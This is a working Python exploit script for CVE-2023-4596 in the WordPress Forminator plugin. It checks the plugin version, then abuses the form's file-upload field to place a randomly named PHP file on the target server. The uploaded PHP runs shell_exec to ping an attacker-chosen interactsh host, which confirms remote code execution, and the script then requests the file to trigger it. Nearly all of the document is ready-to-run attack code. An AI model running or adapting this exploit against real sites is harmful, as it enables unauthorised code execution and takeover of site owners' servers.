import requests
import datetime
import argparse
import re
import random
import string

print(r'''
______                   _             _              ______  _____  _____ 
|  ___|                 (_)           | |             | ___ \/  __ \|  ___|
| |_ ___  _ __ _ __ ___  _ _ __   __ _| |_ ___  _ __  | |_/ /| /  \/| |__  
|  _/ _ \| '__| '_ ` _ \| | '_ \ / _` | __/ _ \| '__| |    / | |    |  __| 
| || (_) | |  | | | | | | | | | | (_| | || (_) | |    | |\ \ | \__/\| |___ 
\_| \___/|_|  |_| |_| |_|_|_| |_|\__,_|\__\___/|_|    \_| \_| \____/\____/ 
                                                                           
''')

parser = argparse.ArgumentParser(description="Script to check for CVE-2023-4596")
parser.add_argument("-u", required=True, help="Full URL of a page with file upload")
parser.add_argument("-v", action="store_true", help="Check for vulnerable version")

args = parser.parse_args()
full_url = args.u

match = re.match(r"(https?://)(.*?)(/.*)?$", full_url)
if match:
    http_prefix = match.group(1)
    new_domain = http_prefix + match.group(2)
    page = match.group(3) or "/"
else:
    print("Invalid URL format")
    exit()

if args.v:
    version_check_url = new_domain.rstrip('/') + "/wp-content/plugins/forminator/readme.txt"
    try:
        response = requests.get(version_check_url, timeout=5)
        if response.status_code == 200:
            readme_content = response.text
            stable_tag_match = re.search(r"Stable tag:\s*([\d.]+)", readme_content)
            if stable_tag_match:
                stable_tag = stable_tag_match.group(1)
                if stable_tag <= "1.24.6":
                    print("[+] Vulnerable version found:", stable_tag)
                else:
                    print("[-] Version is not vulnerable:", stable_tag)
            else:
                print("[-] Could not determine Stable tag in readme.txt")
        else:
            print("[-] Unable to fetch readme.txt:", response.status_code)
    except requests.RequestException as e:
        print("[-] An error occurred while fetching readme.txt:", str(e))
    exit()

interact = input("Input interactsh link: ")
url = new_domain + "/wp-admin/admin-ajax.php"

headers = {
    "Content-Length": "1292",
    "Accept": "*/*",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarytsSnyRY1FWmgGHpA",
    "X-Requested-With": "XMLHttpRequest",
}

def generate_random_string(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))

random_filename = generate_random_string(10) + ".php"

data = f"""------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="postdata-1-post-image"; filename="{random_filename}"
Content-Type: application/x-php

<?php
$domain = "{interact}";
$ip = gethostbyname($domain);
$command = "ping -c 4 " . $ip;
$output = shell_exec($command);
echo "<pre>$output</pre>";
?>
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="forminator_nonce"

30a4b73b31
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="_wp_http_referer"

{page}
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="form_id"

6
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="current_url"

{new_domain}{page}
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="action"

forminator_submit_form_custom-forms
"""

print("\n[+] Sending payload to target")

try:
    response = requests.post(full_url, headers=headers, data=data, timeout=10)
    if response.status_code == 200:
        print("[+] Successful file upload!\n")
    else:
        print("[-] Server returned an unexpected response:", response.status_code)
        exit(1)
except requests.Timeout:
    print("[-] Request timed out. Server is unavailable.")
    exit(1)
except requests.RequestException as e:
    print("[-] An error occurred:", str(e))
    exit(1)

now = datetime.datetime.now()
current_year = now.year
current_month = str(now.month).zfill(2)

uploaded_file_url = f"{new_domain}/wp-content/uploads/{current_year}/{current_month}/{random_filename}"

print("Uploaded File Location:", uploaded_file_url)

print("\n[+] Sending request to uploaded file...")
try:
    uploaded_file_response = requests.get(uploaded_file_url, timeout=5)  # Put this on purpose on a low timeout since it should be directly triggered; if the request fails, something is wrong with your interactsh link (don't use https)
    if uploaded_file_response.status_code == 200:
        print("[+] Successfully triggered the uploaded file!")
        print("[+] Check Interactsh for an incoming request.")
    else:
        print("[-] Server returned an unexpected response:", uploaded_file_response.status_code)
        exit(1)
except requests.Timeout:
    print("[-] Request timed out. This could be due to the server being unavailable or because your Interactsh link was entered with an HTTPS prefix.")
    exit(1)
except requests.RequestException as e:
    print("[-] An error occurred:", str(e))
    exit(1)
